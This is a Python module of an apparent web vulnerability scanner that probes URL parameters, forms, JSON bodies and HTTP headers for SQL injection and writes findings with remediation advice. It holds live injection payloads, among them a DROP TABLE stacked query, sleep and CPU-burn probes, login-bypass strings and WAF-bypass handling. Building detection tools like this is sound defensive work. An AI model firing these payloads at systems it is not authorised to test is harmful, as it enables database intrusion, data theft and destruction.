"""
SQLInjectionTester — Professional-grade SQL Injection vulnerability detection.
OWASP A03:2021 — Injection.

Tests for: error-based, UNION-based, blind boolean (statistical), blind time-based
(per DB), stacked queries, second-order, HTTP header injection, WAF bypass,
and database-specific injection vectors.
"""
import logging
import statistics
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base_tester import BaseTester
from apps.scanning.engine.payloads.sqli_payloads import (
    get_sqli_payloads_by_depth,
    get_time_based_payloads,
    SQLI_ERROR_PATTERNS,
    WAF_SIGNATURES,
    UNION_BASED,
    WAF_BYPASS,
)

logger = logging.getLogger(__name__)

# Stacked query payloads — attempt to execute a second SQL statement
STACKED_QUERIES = [
    "'; SELECT pg_sleep(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "'; SELECT SLEEP(3)#",
    "'; SELECT 1; SELECT 2--",
    "'; DROP TABLE __sqli_test__--",            # safe — table won't exist
    "'; SELECT BENCHMARK(5000000,SHA1('a'))#",  # MySQL CPU burn
]

# HTTP headers commonly injected into SQL queries (logging, analytics)
_SQLI_HEADER_NAMES = ['User-Agent', 'Referer', 'X-Forwarded-For', 'Cookie', 'Accept-Language']

# Second-order indicators — pages that show stored data
_STORE_INDICATORS = ['profile', 'account', 'settings', 'admin', 'dashboard',
                     'comment', 'review', 'message', 'search', 'history']

logger = logging.getLogger(__name__)


class SQLInjectionTester(BaseTester):
    """Test for SQL injection vulnerabilities in forms and URL parameters."""

    TESTER_NAME = 'SQL Injection'
    TIME_THRESHOLD = 2.5  # seconds — indicates time-based blind success

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []
        payloads = get_sqli_payloads_by_depth(depth)
        payloads = self._augment_payloads_with_seclists(payloads, 'sqli', recon_data)

        # WAF-aware: prioritize bypass payloads when WAF detected
        if self._should_use_waf_bypass(recon_data):
            payloads = WAF_BYPASS + payloads
            logger.info('WAF detected — prepending %d WAF bypass payloads for SQLi', len(WAF_BYPASS))

        # Test URL parameters
        for param_name, param_values in page.parameters.items():
            # Error-based / standard injection
            for payload in payloads:
                vuln = self._test_parameter(page.url, param_name, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    break  # One finding per parameter

            # Boolean blind (medium/deep only) — statistical analysis
            if depth in ('medium', 'deep') and not any(
                v.get('name', '').endswith(param_name) for v in vulnerabilities
            ):
                vuln = self._test_boolean_blind(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

            # Time-based blind (medium/deep only)
            if depth in ('medium', 'deep') and not any(
                v.get('name', '').endswith(param_name) for v in vulnerabilities
            ):
                vuln = self._test_time_based_blind(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

        # Test form inputs
        for form in page.forms:
            for inp in form.inputs:
                if inp.input_type in ('hidden', 'submit', 'button', 'image', 'file'):
                    continue
                for payload in payloads:
                    vuln = self._test_form_input(form, inp, payload, page.url)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # One finding per input

        # Medium+ advanced tests (Phase 8)
        if depth in ('medium', 'deep'):
            # JSON body SQLi — inject into JSON string values
            for form in page.forms:
                vuln = self._test_json_body_sqli(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

            # Extended header-based SQLi (X-Forwarded-For, Client-IP, etc.)
            header_vulns = self._test_extended_header_sqli(page)
            vulnerabilities.extend(header_vulns)

        # Deep-only advanced tests
        if depth == 'deep':
            # UNION-based column detection
            for param_name in page.parameters:
                if not any(v.get('name', '').endswith(param_name) for v in vulnerabilities):
                    vuln = self._test_union_based(page.url, param_name)
                    if vuln:
                        vulnerabilities.append(vuln)

            # Stacked query testing
            for param_name in page.parameters:
                if not any(v.get('name', '').endswith(param_name) for v in vulnerabilities):
                    vuln = self._test_stacked_queries(page.url, param_name)
                    if vuln:
                        vulnerabilities.append(vuln)

            # HTTP header injection (e.g., User-Agent → log table)
            header_vulns = self._test_header_sqli(page)
            vulnerabilities.extend(header_vulns)

            # Second-order SQLi detection (deep only)
            for form in page.forms:
                vuln = self._test_second_order(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

            # Second-order SQLi confirmation (store then retrieve)
            for form in page.forms:
                vuln = self._test_second_order_confirmation(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

        # OOB blind SQLi — inject callbacks for blind detection via DNS/HTTP
        if depth in ('medium', 'deep'):
            self._inject_oob_sqli(page, recon_data)

        return vulnerabilities

    def _inject_oob_sqli(self, page, recon_data):
        """Inject OOB payloads for blind SQL injection detection."""
        oob_payloads = self._get_oob_payloads('sqli', '', page.url, recon_data)
        if not oob_payloads:
            return
        for param_name in page.parameters:
            param_oob = self._get_oob_payloads('sqli', param_name, page.url, recon_data)
            for payload, _callback_id in param_oob[:3]:
                self._make_request('GET', page.url, params={param_name: payload})
            break  # Limit to first param to avoid excessive requests

    def _test_parameter(self, url, param_name, payload):
        """Test a URL parameter for SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = payload

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params, doseq=True), ''
        ))

        response = self._make_request('GET', test_url)
        if not response:
            return None

        # Check for WAF blocking
        if self._is_waf_blocked(response):
            return None

        if self._check_sqli_indicators(response):
            return self._build_vuln(
                name=f'SQL Injection in URL Parameter: {param_name}',
                severity='critical',
                category='Injection',
                description=f'The URL parameter "{param_name}" is vulnerable to SQL injection. '
                           f'The application includes user input in SQL queries without proper sanitization.',
                impact='An attacker could read, modify, or delete database contents, bypass authentication, '
                      'or execute administrative operations on the database.',
                remediation='Use parameterized queries (prepared statements) instead of string concatenation. '
                           'In Python: cursor.execute("SELECT * FROM users WHERE id = %s", [user_id]). '
                           'Use an ORM like Django ORM or SQLAlchemy that handles parameterization automatically.',
                cwe='CWE-89',
                cvss=9.8,
                affected_url=url,
                evidence=f'Payload: {param_name}={payload}\nResponse contained SQL error indicators.',
            )
        return None

    def _test_form_input(self, form, inp, payload, page_url):
        """Test a form input for SQL injection."""
        data = {}
        for form_inp in form.inputs:
            if form_inp.name == inp.name:
                data[form_inp.name] = payload
            else:
                data[form_inp.name] = form_inp.value or 'test'

        method = form.method.upper()
        target_url = form.action or page_url

        if method == 'POST':
            response = self._make_request('POST', target_url, data=data)
        else:
            response = self._make_request('GET', target_url, params=data)

        if not response:
            return None

        if self._is_waf_blocked(response):
            return None

        if self._check_sqli_indicators(response):
            return self._build_vuln(
                name=f'SQL Injection in Form Field: {inp.name}',
                severity='critical',
                category='Injection',
                description=f'The form field "{inp.name}" at {target_url} is vulnerable to SQL injection.',
                impact='An attacker could bypass authentication, extract sensitive data from the database, '
                      'modify or delete records, or execute system commands.',
                remediation='Use parameterized queries or an ORM. Never concatenate user input into SQL strings. '
                           'Apply input validation and use stored procedures where appropriate.',
                cwe='CWE-89',
                cvss=9.8,
                affected_url=target_url,
                evidence=f'Form: {form.method} {target_url}\nField: {inp.name}\nPayload: {payload}',
            )
        return None

    def _test_boolean_blind(self, url, param_name):
        """Test for boolean-based blind SQL injection with statistical confidence.

        Sends multiple true/false condition pairs and uses standard deviation
        analysis to reduce false positives from dynamic content.
        """
        true_payloads = ["' AND '1'='1", "' AND 1=1--", "') AND ('1'='1"]
        false_payloads = ["' AND '1'='2", "' AND 1=2--", "') AND ('1'='2"]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        true_lengths = []
        false_lengths = []

        for t_payload, f_payload in zip(true_payloads, false_payloads):
            # Send true condition
            params[param_name] = t_payload
            true_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            true_resp = self._make_request('GET', true_url)

            # Send false condition
            params[param_name] = f_payload
            false_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, urlencode(params, doseq=True), ''))
            false_resp = self._make_request('GET', false_url)

            if not true_resp or not false_resp:
                continue
            if true_resp.status_code != 200 or false_resp.status_code != 200:
                continue

            true_lengths.append(len(true_resp.text))
            false_lengths.append(len(false_resp.text))

        if len(true_lengths) < 2:
            return None

        # Statistical analysis: true answers should be consistent with each other
        # and consistently different from false answers
        true_mean = statistics.mean(true_lengths)
        false_mean = statistics.mean(false_lengths)
        diff_ratio = abs(true_mean - false_mean) / max(true_mean, false_mean, 1)

        # Check that true results are internally consistent (low variance)
        true_stdev = statistics.stdev(true_lengths) if len(true_lengths) > 1 else 0
        false_stdev = statistics.stdev(false_lengths) if len(false_lengths) > 1 else 0
        max_stdev = max(true_stdev, false_stdev)

        # Significant difference between true/false with low internal variance
        if diff_ratio > 0.08 and max_stdev < abs(true_mean - false_mean) * 0.5:
            confidence = 'high' if diff_ratio > 0.2 and max_stdev < 50 else 'medium'
            return self._build_vuln(
                name=f'Blind Boolean SQL Injection: {param_name}',
                severity='high',
                category='Injection',
                description=f'The parameter "{param_name}" shows statistically different responses '
                           f'for true/false SQL conditions across {len(true_lengths)} test pairs, '
                           f'indicating blind SQL injection (confidence: {confidence}).',
                impact='An attacker can extract database contents one bit at a time, though it is slower '
                      'than error-based injection.',
                remediation='Use parameterized queries. Implement input validation. '
                           'Use an ORM that prevents SQL injection.',
                cwe='CWE-89',
                cvss=8.6,
                affected_url=url,
                evidence=f'True responses mean length: {true_mean:.0f} (stdev: {true_stdev:.1f})\n'
                        f'False responses mean length: {false_mean:.0f} (stdev: {false_stdev:.1f})\n'
                        f'Difference ratio: {diff_ratio:.2%}\n'
                        f'Statistical confidence: {confidence}',
            )
        return None

    def _test_time_based_blind(self, url, param_name):
        """Test for time-based blind SQL injection using DB-specific sleep functions."""
        time_payloads = get_time_based_payloads()

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for db_name, db_payloads in time_payloads.items():
            for payload in db_payloads[:2]:  # Test first 2 per DB to limit requests
                params[param_name] = payload
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, urlencode(params, doseq=True), ''))

                response = self._make_request('GET', test_url, timeout=15)
                if response and hasattr(response, 'elapsed'):
                    if response.elapsed.total_seconds() > self.TIME_THRESHOLD:
                        return self._build_vuln(
                            name=f'Time-Based Blind SQL Injection ({db_name}): {param_name}',
                            severity='high',
                            category='Injection',
                            description=f'The parameter "{param_name}" is vulnerable to time-based blind '
                                       f'SQL injection. The {db_name} database sleep function caused a '
                                       f'measurable delay.',
                            impact='An attacker can extract database contents using timed queries, '
                                  'including usernames, passwords, and sensitive data.',
                            remediation='Use parameterized queries. Never concatenate user input into SQL. '
                                       'Implement query timeouts and rate limiting.',
                            cwe='CWE-89',
                            cvss=8.6,
                            affected_url=url,
                            evidence=f'Payload: {payload}\n'
                                    f'Response time: {response.elapsed.total_seconds():.2f}s\n'
                                    f'Database type: {db_name}',
                        )
        return None

    def _test_union_based(self, url, param_name):
        """Test for UNION-based SQL injection by detecting column count."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in UNION_BASED[:8]:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))

            response = self._make_request('GET', test_url)
            if not response:
                continue

            # UNION success: no SQL error AND response differs from error responses
            if response.status_code == 200 and not self._has_sqli_error(response.text):
                # Check if we got extra data in response
                body = response.text.lower()
                if 'null' in body or any(str(i) in body for i in range(1, 10)):
                    return self._build_vuln(
                        name=f'UNION-Based SQL Injection: {param_name}',
                        severity='critical',
                        category='Injection',
                        description=f'The parameter "{param_name}" is vulnerable to UNION-based '
                                   f'SQL injection, allowing direct data extraction.',
                        impact='An attacker can directly extract entire database contents including '
                              'usernames, passwords, credit cards, and any stored data.',
                        remediation='Use parameterized queries or prepared statements. '
                                   'Implement strict input validation and type checking.',
                        cwe='CWE-89',
                        cvss=9.8,
                        affected_url=url,
                        evidence=f'Payload: {payload}\nUNION query was accepted by the database.',
                    )
        return None

    def _check_sqli_indicators(self, response):
        """Check if response indicates SQL injection vulnerability."""
        if not response or not response.text:
            return False

        body = response.text

        # Check for SQL error messages
        if self._has_sqli_error(body):
            return True

        # Check for time-based blind injection
        if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > self.TIME_THRESHOLD:
            return True

        return False

    def _has_sqli_error(self, body):
        """Check if response body contains SQL error patterns."""
        if not body:
            return False
        for pattern in SQLI_ERROR_PATTERNS:
            if pattern.search(body):
                return True
        return False

    def _is_waf_blocked(self, response):
        """Detect if a WAF blocked the request."""
        if response.status_code in (403, 406, 429, 503):
            headers_str = str(response.headers).lower()
            body_lower = response.text.lower() if response.text else ''
            for waf_name, signatures in WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig in headers_str or sig in body_lower:
                        logger.debug(f'WAF detected: {waf_name}')
                        return True
        return False

    # ── New Phase 3 methods ───────────────────────────────────────────────────

    def _test_stacked_queries(self, url, param_name):
        """Test for stacked query support (multi-statement execution).

        Stacked queries allow executing entirely separate SQL statements,
        enabling INSERT/UPDATE/DELETE/DROP operations beyond just SELECT.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in STACKED_QUERIES:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))

            response = self._make_request('GET', test_url, timeout=15)
            if not response:
                continue

            # Check for time-delayed stacked queries (pg_sleep, WAITFOR, SLEEP)
            is_sleep_payload = any(s in payload.upper() for s in ('SLEEP', 'PG_SLEEP', 'WAITFOR', 'BENCHMARK'))
            if is_sleep_payload and hasattr(response, 'elapsed'):
                if response.elapsed.total_seconds() > self.TIME_THRESHOLD:
                    return self._build_vuln(
                        name=f'Stacked Query SQL Injection: {param_name}',
                        severity='critical',
                        category='Injection',
                        description=f'The parameter "{param_name}" supports stacked SQL queries. '
                                   f'A separate SQL statement was executed after the semicolon.',
                        impact='Stacked queries allow arbitrary SQL execution including INSERT, '
                              'UPDATE, DELETE, and DROP statements. This is the most dangerous '
                              'form of SQL injection — full database compromise is possible.',
                        remediation='Use parameterized queries. Disable multi-statement execution '
                                   'in database connection settings where possible. '
                                   'In PHP: use PDO with ATTR_EMULATE_PREPARES = false.',
                        cwe='CWE-89',
                        cvss=9.8,
                        affected_url=url,
                        evidence=f'Payload: {payload}\n'
                                f'Response time: {response.elapsed.total_seconds():.2f}s\n'
                                f'Second statement was executed (time delay confirmed).',
                    )

            # Check for error indicating stacked query was partially parsed
            if self._has_sqli_error(response.text):
                return self._build_vuln(
                    name=f'Potential Stacked Query Injection: {param_name}',
                    severity='high',
                    category='Injection',
                    description=f'The parameter "{param_name}" produced a SQL error when a '
                               f'semicolon-separated query was injected, suggesting the database '
                               f'attempted to parse multiple statements.',
                    impact='If stacked queries are supported, attackers can execute arbitrary '
                          'SQL statements including data modification and deletion.',
                    remediation='Use parameterized queries. Disable multi-statement execution.',
                    cwe='CWE-89',
                    cvss=8.6,
                    affected_url=url,
                    evidence=f'Payload: {payload}\nSQL error detected in response.',
                )
        return None

    def _test_header_sqli(self, page):
        """Test for SQL injection via HTTP headers.

        Applications often log User-Agent, Referer, X-Forwarded-For into
        database tables, creating second-order or direct injection paths.
        """
        vulns = []
        sqli_payloads = ["' OR '1'='1", "' AND 1=CONVERT(int,@@version)--",
                         "' UNION SELECT NULL--", "1' WAITFOR DELAY '0:0:2'--"]

        for header_name in _SQLI_HEADER_NAMES:
            for payload in sqli_payloads[:2]:
                custom_headers = {header_name: payload}
                response = self._make_request('GET', page.url, headers=custom_headers)
                if not response:
                    continue

                if self._has_sqli_error(response.text):
                    vulns.append(self._build_vuln(
                        name=f'SQL Injection via HTTP Header: {header_name}',
                        severity='critical',
                        category='Injection',
                        description=f'The "{header_name}" HTTP header value is included in a SQL '
                                   f'query without sanitization. A SQL error was triggered.',
                        impact='Attackers can inject SQL via standard HTTP headers that are often '
                              'logged or processed server-side, bypassing input validation '
                              'focused on form/URL parameters.',
                        remediation='Parameterize all SQL queries, including those that use HTTP '
                                   f'header values. Never trust the {header_name} header as safe input.',
                        cwe='CWE-89',
                        cvss=9.8,
                        affected_url=page.url,
                        evidence=f'Header: {header_name}: {payload}\n'
                                f'SQL error detected in response body.',
                    ))
                    break  # One finding per header

                # Time-based detection for headers
                if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > self.TIME_THRESHOLD:
                    vulns.append(self._build_vuln(
                        name=f'Blind SQL Injection via Header: {header_name}',
                        severity='high',
                        category='Injection',
                        description=f'The "{header_name}" header may be used in a SQL query. '
                                   f'A time-delay payload caused a {response.elapsed.total_seconds():.1f}s response.',
                        impact='Header values injected into SQL queries can be exploited for '
                              'blind data extraction.',
                        remediation=f'Parameterize all queries using {header_name} header values.',
                        cwe='CWE-89',
                        cvss=8.6,
                        affected_url=page.url,
                        evidence=f'Header: {header_name}: {payload}\n'
                                f'Response time: {response.elapsed.total_seconds():.2f}s',
                    ))
                    break

        return vulns

    def _test_second_order(self, form, page):
        """Test for second-order SQL injection.

        Injects a payload into a storage form (profile, comment, etc.) and
        checks if viewing a related page triggers a SQL error, indicating
        the stored value was used in a subsequent unsanitized query.
        """
        # Only test forms that look like they store data
        text_input = None
        for inp in form.inputs:
            if inp.input_type in ('hidden', 'submit', 'button', 'file', 'image'):
                continue
            if any(ind in (inp.name or '').lower() for ind in _STORE_INDICATORS):
                text_input = inp
                break

        if not text_input:
            return None

        second_order_payload = "admin'--"
        data = {}
        for form_inp in form.inputs:
            if form_inp.name == text_input.name:
                data[form_inp.name] = second_order_payload
            else:
                data[form_inp.name] = form_inp.value or 'test'

        target_url = form.action or page.url
        method = form.method.upper()

        # Submit the payload
        if method == 'POST':
            self._make_request('POST', target_url, data=data)
        else:
            self._make_request('GET', target_url, params=data)

        # Now visit pages that might use the stored value in a query
        check_urls = [page.url]  # Re-check the same page
        parsed = urlparse(page.url)
        for indicator in _STORE_INDICATORS[:5]:
            check_urls.append(f'{parsed.scheme}://{parsed.netloc}/{indicator}')

        for check_url in check_urls:
            response = self._make_request('GET', check_url)
            if response and self._has_sqli_error(response.text):
                return self._build_vuln(
                    name=f'Second-Order SQL Injection via Form: {text_input.name}',
                    severity='critical',
                    category='Injection',
                    description=f'A SQL payload stored via form field "{text_input.name}" '
                               f'triggered a SQL error when the stored value was used in a '
                               f'subsequent query on {check_url}.',
                    impact='Second-order SQLi is extremely dangerous because the injection '
                          'point is separated from the trigger point. Input validation at '
                          'the storage point may pass, but the payload activates later.',
                    remediation='Use parameterized queries everywhere, not just at input points. '
                               'Sanitize data both when storing AND when retrieving for use in queries.',
                    cwe='CWE-89',
                    cvss=9.8,
                    affected_url=target_url,
                    evidence=f'Storage field: {text_input.name}\n'
                            f'Payload: {second_order_payload}\n'
                            f'SQL error triggered on: {check_url}',
                )
        return None

    # ── Phase 8 methods ───────────────────────────────────────────────────────

    def _test_json_body_sqli(self, form, page):
        """Test for SQL injection via JSON request bodies.

        When Content-Type is application/json, inject SQL payloads into
        string values of JSON objects sent to POST/PUT/PATCH endpoints.
        """
        if form.method.upper() not in ('POST', 'PUT', 'PATCH'):
            return None

        target_url = form.action or page.url
        json_payloads = [
            {"username": "' OR '1'='1", "password": "x"},
            {"username": "admin'--", "password": "x"},
            {"email": "' UNION SELECT NULL--", "name": "test"},
            {"id": "1 OR 1=1", "action": "view"},
            {"search": "' AND 1=CONVERT(int,@@version)--"},
        ]

        for json_data in json_payloads:
            resp = self._make_request(
                form.method.upper(), target_url,
                json=json_data,
                headers={'Content-Type': 'application/json'},
            )
            if not resp:
                continue
            if self._has_sqli_error(resp.text):
                return self._build_vuln(
                    name=f'JSON Body SQL Injection at {target_url}',
                    severity='critical',
                    category='Injection',
                    description='SQL injection via JSON request body. The application parses JSON '
                               'values and includes them in SQL queries without parameterization.',
                    impact='Attackers can extract or modify database data by injecting SQL payloads '
                          'into JSON fields, bypassing form-based input validation.',
                    remediation='Use parameterized queries for all data sources including JSON bodies. '
                               'Validate and sanitize JSON field values before use in SQL.',
                    cwe='CWE-89',
                    cvss=9.8,
                    affected_url=target_url,
                    evidence=f'JSON payload: {json_data}\nSQL error detected in response body.',
                )
        return None

    def _test_extended_header_sqli(self, page):
        """Test SQL injection via additional HTTP headers commonly used in logging.

        Extensions to the existing _test_header_sqli for broader header coverage.
        """
        vulns = []
        # Headers commonly interpolated into SQL by logging/analytics code
        extended_headers = ['Client-IP', 'True-Client-IP', 'X-Real-IP',
                           'X-Client-IP', 'CF-Connecting-IP', 'X-Cluster-Client-IP']
        sqli_payloads = ["' OR '1'='1", "1' AND 1=CONVERT(int,@@version)--"]

        for header_name in extended_headers:
            for payload in sqli_payloads:
                custom_headers = {header_name: payload}
                resp = self._make_request('GET', page.url, headers=custom_headers)
                if not resp:
                    continue
                if self._has_sqli_error(resp.text):
                    vulns.append(self._build_vuln(
                        name=f'SQL Injection via Header: {header_name}',
                        severity='critical',
                        category='Injection',
                        description=f'The "{header_name}" HTTP header is used in a SQL query '
                                   f'without sanitization. A SQL error was triggered.',
                        impact='IP-related headers are commonly logged into databases. If not '
                              'parameterized, attackers can inject SQL via spoofed headers.',
                        remediation=f'Parameterize all SQL queries using {header_name} values. '
                                   f'Never interpolate HTTP header values directly into SQL.',
                        cwe='CWE-89',
                        cvss=9.8,
                        affected_url=page.url,
                        evidence=f'Header: {header_name}: {payload}\n'
                                f'SQL error in response.',
                    ))
                    break
        return vulns

    def _test_second_order_confirmation(self, form, page):
        """Confirm second-order SQLi by storing payload, then triggering retrieval.

        Unlike _test_second_order which looks for errors, this method stores a
        time-delay payload and measures the response time on the retrieval page.
        """
        text_input = None
        for inp in form.inputs:
            if inp.input_type in ('hidden', 'submit', 'button', 'file', 'image'):
                continue
            if any(ind in (inp.name or '').lower() for ind in _STORE_INDICATORS):
                text_input = inp
                break
        if not text_input:
            return None

        # Store a time-delay payload
        delay_payload = "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--"
        data = {}
        for form_inp in form.inputs:
            if form_inp.name == text_input.name:
                data[form_inp.name] = delay_payload
            else:
                data[form_inp.name] = form_inp.value or 'test'

        target_url = form.action or page.url
        method = form.method.upper()
        if method == 'POST':
            self._make_request('POST', target_url, data=data)
        else:
            self._make_request('GET', target_url, params=data)

        # Now trigger retrieval — measure response time
        parsed = urlparse(page.url)
        retrieval_urls = [page.url]
        for indicator in _STORE_INDICATORS[:3]:
            retrieval_urls.append(f'{parsed.scheme}://{parsed.netloc}/{indicator}')

        for check_url in retrieval_urls:
            resp = self._make_request('GET', check_url, timeout=15)
            if resp and hasattr(resp, 'elapsed'):
                if resp.elapsed.total_seconds() > self.TIME_THRESHOLD:
                    return self._build_vuln(
                        name=f'Confirmed Second-Order SQLi via {text_input.name}',
                        severity='critical',
                        category='Injection',
                        description=f'A time-delay SQL payload stored via "{text_input.name}" '
                                   f'caused a measurable delay when the stored value was '
                                   f'retrieved and used in a query on {check_url}.',
                        impact='Confirmed second-order SQL injection. The stored payload executes '
                              'when retrieved, enabling full database compromise.',
                        remediation='Parameterize ALL queries including those using stored data. '
                                   'Never trust data from the database as safe for SQL.',
                        cwe='CWE-89',
                        cvss=9.8,
                        affected_url=target_url,
                        evidence=f'Storage field: {text_input.name}\n'
                                f'Delay payload: {delay_payload}\n'
                                f'Retrieval URL: {check_url}\n'
                                f'Response time: {resp.elapsed.total_seconds():.2f}s',
                    )
        return None
